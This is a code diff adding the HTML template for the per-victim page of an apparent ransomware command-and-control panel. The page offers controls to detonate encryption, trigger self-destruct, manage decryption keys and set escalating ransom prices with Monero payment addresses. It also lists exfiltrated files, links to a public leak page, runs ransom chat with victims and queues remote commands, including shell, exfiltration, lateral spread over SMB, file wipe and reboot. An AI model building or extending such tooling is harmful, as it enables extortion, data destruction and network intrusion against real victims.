@@ -1,0 +1,322 @@
+{% extends "base.html" %}
+{% block title %}{{ v['hostname'] or 'victim' }}{% endblock %}
+{% block content %}
+<h1>{{ v['hostname'] or 'unknown host' }}</h1>
+{% if root_events %}
+<div class="root-banner">
+  ROOT OVERRIDE
+  {% for e in root_events %}
+  <div class="small">{{ e['ts'] }} · {{ e['kind'] }} · {{ e['detail'] }}</div>
+  {% endfor %}
+</div>
+{% endif %}
+<p class="sub">
+  <a href="{{ url_for('dashboard') }}">&lt; dashboard</a> ·
+  vid <code>{{ v['vid'] }}</code> ·
+  {% if online %}<span class="badge on">online</span>{% else %}<span class="badge off">offline</span>{% endif %}
+</p>
+
+<div class="cards">
+  <div class="card">status <b class="status-{{ v['status'] }}">{{ v['status'] }}</b></div>
+  <div class="card danger">armed
+    <b>{% if v['detonate']==1 %}YES{% elif v['detonate']==2 %}KILL{% else %}no{% endif %}</b></div>
+  <div class="card">price <b>${{ "%.0f"|format(v['price'] or 0) }}</b></div>
+  <div class="card">first seen <b class="small">{{ v['timestamp'] or '?' }}</b></div>
+  <div class="card">last ping <b class="small">{{ v['last_ping'] or 'never' }}</b></div>
+</div>
+
+{% if can_operate %}
+<div class="filter">
+  {% if v['detonate'] %}
+  <form method="post" action="{{ url_for('detonate_reset', vid=v['vid']) }}" class="inline">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn" type="submit">RESET FLAG</button>
+  </form>
+  {% else %}
+  <form method="post" action="{{ url_for('detonate', vid=v['vid']) }}" class="inline"
+        onsubmit="return confirm('Arm this victim?')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn red" type="submit">DETONATE</button>
+  </form>
+  {% endif %}
+  <form method="post" action="{{ url_for('kill', vid=v['vid']) }}" class="inline"
+        onsubmit="return confirm('Queue self-destruct?')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn red" type="submit">KILL</button>
+  </form>
+  {% if current_role == 'root' %}
+  <form method="post" action="{{ url_for('pardon', vid=v['vid']) }}" class="inline"
+        onsubmit="return confirm('Pardon this victim and decrypt it remotely?')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn blue" type="submit">PARDON</button>
+  </form>
+  <form method="post" action="{{ url_for('root_release', vid=v['vid']) }}" class="inline"
+        onsubmit="return confirm('Mark paid without payment and unlock the portal?')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn" type="submit">ROOT RELEASE</button>
+  </form>
+  {% else %}
+  <span class="btn dim locked" title="requires root">ROOT ONLY</span>
+  {% endif %}
+  <form method="post" action="{{ url_for('mark_paid', vid=v['vid']) }}" class="inline"
+        onsubmit="return confirm('Mark as paid?')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn blue" type="submit">MARK PAID</button>
+  </form>
+  {% if aes_display and show_keys %}
+    <a class="btn blue" href="{{ url_for('admin_decryptor', vid=v['vid']) }}">DECRYPTER .CPP</a>
+    {% if exe_build_available %}
+    <a class="btn blue" href="{{ url_for('admin_decryptor_exe', vid=v['vid']) }}">DECRYPTER .EXE</a>
+    {% endif %}
+  {% endif %}
+</div>
+{% endif %}
+
+<div class="grid">
+  {% if show_keys %}
+  <div class="panel">
+    <h2>Keys</h2>
+    <dl class="kv">
+      <dt>wrapped (RSA)</dt><dd><code>{{ v['wrapped_key'] or '—' }}</code></dd>
+      <dt>aes-256 (b64)</dt><dd><code>{{ aes_display or 'not unwrapped' }}</code></dd>
+    </dl>
+    <details><summary>manual AES key override</summary>
+      <form method="post" action="{{ url_for('update_victim') }}">
+        <input type="hidden" name="csrf" value="{{ csrf_token }}">
+        <input type="hidden" name="vid" value="{{ v['vid'] }}">
+        <input type="hidden" name="update_type" value="aes_key">
+        <input name="aes_key" value="{{ aes_display }}" placeholder="base64 32-byte key">
+        <div style="height:8px"></div>
+        <button class="btn" type="submit">SAVE KEY</button>
+      </form>
+    </details>
+  </div>
+  {% endif %}
+
+  {% if can_operate %}
+  <div class="panel">
+    <h2>Management</h2>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="status">
+      <label>status</label>
+      <select name="status">
+        {% for st in ['encrypted','negotiating','paid','dead'] %}
+        <option value="{{ st }}" {{ 'selected' if v['status']==st }}>{{ st }}</option>
+        {% endfor %}
+      </select>
+      <div style="height:8px"></div>
+      <button class="btn" type="submit">UPDATE STATUS</button>
+    </form>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="tags">
+      <label>tags</label>
+      <input name="tags" value="{{ v['tags'] or '' }}" placeholder="dc, finance, vip">
+      <div style="height:8px"></div>
+      <button class="btn" type="submit">SAVE TAGS</button>
+    </form>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="price">
+      <label>price (usd)</label>
+      <input name="price" value="{{ v['price'] or 0 }}" inputmode="decimal">
+      <div style="height:8px"></div>
+      <button class="btn" type="submit">SAVE PRICE</button>
+    </form>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="xmr">
+      <label>xmr address</label>
+      <input name="xmr_address" value="{{ v['xmr_address'] or '' }}">
+      <div style="height:8px"></div>
+      <button class="btn" type="submit">SAVE ADDRESS</button>
+    </form>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="notes">
+      <label>notes</label>
+      <textarea name="notes" rows="3">{{ v['notes'] or '' }}</textarea>
+      <div style="height:8px"></div>
+      <button class="btn" type="submit">SAVE NOTES</button>
+    </form>
+  </div>
+  {% endif %}
+</div>
+
+<div class="grid">
+  <div class="panel">
+    <h2>Campaign</h2>
+    <p>invoice <code>{{ invoice }}</code></p>
+    <p>deadline <b>{{ deadline or '—' }}</b></p>
+    <p>price due <b>${{ '%.2f'|format(price_due) }}</b>
+       · credited <b>${{ '%.2f'|format(paid_total) }}</b></p>
+    <p class="sub">base ${{ '%.2f'|format(v['price'] or 0) }} — escalates by hours since first contact</p>
+    <h3>Extracted data ({{ uploads|length }} files, {{ '%.1f'|format(uploads_total / 1048576) }} MiB)</h3>
+    <table>
+      <tr><th>name</th><th>size</th><th>staged</th></tr>
+      {% for u in uploads %}
+      <tr><td><a href="{{ url_for('admin_upload', uid=u['id']) }}">{{ u['name'] }}</a></td>
+          <td>{{ u['size'] }}</td><td class="sub small">{{ u['ts'] }}</td></tr>
+      {% else %}<tr><td colspan="3" class="sub">none</td></tr>{% endfor %}
+    </table>
+    <p class="sub small">public: <a href="{{ url_for('leak_page', vid=v['vid']) }}">/leak/{{ v['vid'][:12] }}…</a></p>
+  </div>
+  {% if can_operate %}
+  <div class="panel">
+    <h2>Remote command</h2>
+    <form method="post" action="{{ url_for('queue_command', vid=v['vid']) }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <label>type</label>
+      <select name="ctype">
+        <option value="shell">shell</option>
+        <option value="pull">pull file</option>
+        <option value="push">push file</option>
+        <option value="lock">lock (detonate)</option>
+        <option value="ls">list directory</option>
+        <option value="recon">recon</option>
+        <option value="admins">local admins</option>
+        <option value="sessions">sessions</option>
+        <option value="shares">shares</option>
+        <option value="domain">domain info</option>
+        <option value="users">local users</option>
+        <option value="spread">spread on/off</option>
+        <option value="netenum">spread candidate hosts</option>
+        <option value="smbexec">remote command (host|cmd)</option>
+        <option value="usb">usb on/off/status</option>
+        <option value="exfil">exfil file</option>
+        <option value="screenshot">screenshot</option>
+        <option value="uninstall">uninstall</option>
+        <option value="wipe">wipe (delete files)</option>
+        <option value="reboot">reboot</option>
+      </select>
+      <label>argument (command / remote path)</label><input name="arg">
+      <label>push path</label><input name="path">
+      <label>push data (base64)</label><textarea name="data" rows="2"></textarea>
+      <label>priority</label><input name="priority" value="0" inputmode="numeric">
+      <label>max attempts</label><input name="max_attempts" value="3" inputmode="numeric">
+      <label>timeout (s)</label><input name="timeout_s" value="300" inputmode="numeric">
+      <div style="height:8px"></div>
+      <button class="btn" type="submit">QUEUE COMMAND</button>
+    </form>
+    <table>
+      <tr><th>id</th><th>type</th><th>status</th><th>output</th></tr>
+      {% for c in commands %}
+      <tr><td class="sub small">#{{ c['id'] }}</td><td>{{ c['ctype'] }}</td>
+          <td>{{ c['status'] }}</td>
+          <td class="small">{{ (c['output'] or '')[:60] }}</td></tr>
+      {% else %}<tr><td colspan="4" class="sub">none yet</td></tr>{% endfor %}
+    </table>
+  </div>
+  {% endif %}
+</div>
+
+<div class="grid">
+  <div class="panel">
+    <h2>Chat</h2>
+    <div class="chat" id="chat">
+      {% for m in chat %}
+        <div class="{{ 'm-admin' if m.sender=='ADMIN' else 'm-victim' }}">
+          <span class="m-time">[{{ m.time }}]</span>
+          <b>{{ m.operator or m.sender }}:</b> {{ m.msg }}
+          {% if m.attachment %}<a href="{{ url_for('chat_file', name=m.attachment) }}">[file]</a>{% endif %}</div>
+      {% else %}<div class="sub">no messages</div>{% endfor %}
+    </div>
+    {% if can_negotiate %}
+    <form method="post" action="{{ url_for('send_chat') }}" enctype="multipart/form-data">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input name="message" placeholder="message to victim" autocomplete="off">
+      <input type="file" name="attachment">
+      <div style="height:8px"></div>
+      <button class="btn blue" type="submit">SEND</button>
+    </form>
+    {% endif %}
+    <script>
+    (function(){
+      var last = {{ chat[-1].id if chat else 0 }};
+      setInterval(function(){
+        fetch("{{ url_for('chat_json', vid=v['vid']) }}?since=" + last)
+          .then(function(r){ return r.json(); })
+          .then(function(j){ if (j.messages && j.messages.length) location.reload(); })
+          .catch(function(){});
+      }, 5000);
+    })();
+    </script>
+    <p class="sub small">proof uploads allowed up to {{ proof_max }} MB per sample.</p>
+  </div>
+
+  {% if can_operate %}
+  <div class="panel">
+    <h2>Refund</h2>
+    <form method="post" action="{{ url_for('refund', vid=v['vid']) }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input name="amount" placeholder="amount USD" inputmode="decimal">
+      <input name="note" placeholder="reason">
+      <div style="height:8px"></div>
+      <button class="btn red" type="submit">REFUND</button>
+    </form>
+  </div>
+  {% endif %}
+
+  {% if can_operate %}
+  <div class="panel">
+    <h2>Campaign / negotiation</h2>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="campaign">
+      <select name="campaign_id">
+        <option value="0">no campaign</option>
+        {% for c in campaigns %}
+        <option value="{{ c['id'] }}" {{ 'selected' if v['campaign_id']==c['id'] }}>{{ c['name'] }}</option>
+        {% endfor %}
+      </select>
+      <button class="btn" type="submit">ASSIGN</button>
+    </form>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="step">
+      <select name="negotiation_step">
+        {% for st in ['first','proof','price','final'] %}
+        <option value="{{ st }}" {{ 'selected' if v['negotiation_step']==st }}>{{ st }}</option>
+        {% endfor %}
+      </select>
+      <button class="btn" type="submit">STEP</button>
+    </form>
+    <form method="post" action="{{ url_for('update_victim') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="vid" value="{{ v['vid'] }}">
+      <input type="hidden" name="update_type" value="assign">
+      <input name="assigned_to" value="{{ v['assigned_to'] or '' }}" placeholder="operator">
+      <button class="btn" type="submit">ASSIGN OPERATOR</button>
+    </form>
+    <p class="small sub"><a href="{{ url_for('admin_invoice', vid=v['vid']) }}">invoice PDF</a>
+       · <a href="{{ url_for('admin_invoice_qr', vid=v['vid']) }}">QR</a></p>
+    <table>
+      <tr><th>invoice</th><th>amount</th><th>status</th><th>created</th></tr>
+      {% for i in invoices %}
+      <tr><td>{{ i['number'] }}</td><td>${{ '%.2f'|format(i['amount'] or 0) }}</td>
+        <td>{{ i['status'] }}</td><td class="small">{{ i['created'] }}</td></tr>
+      {% else %}<tr><td colspan="4" class="sub">no invoices</td></tr>{% endfor %}
+    </table>
+  </div>
+  {% endif %}
+
+  <div class="panel">
+    <h2>Timeline</h2>
+    <table>
+      {% for e in events %}
+      <tr><td class="small sub">{{ e['ts'] }}</td><td>{{ e['actor'] }}</td>
+          <td>{{ e['kind'] }}</td><td class="small">{{ e['detail'] }}</td></tr>
+      {% else %}<tr><td class="sub">no events</td></tr>{% endfor %}
+    </table>
+  </div>
+</div>
+{% endblock %}
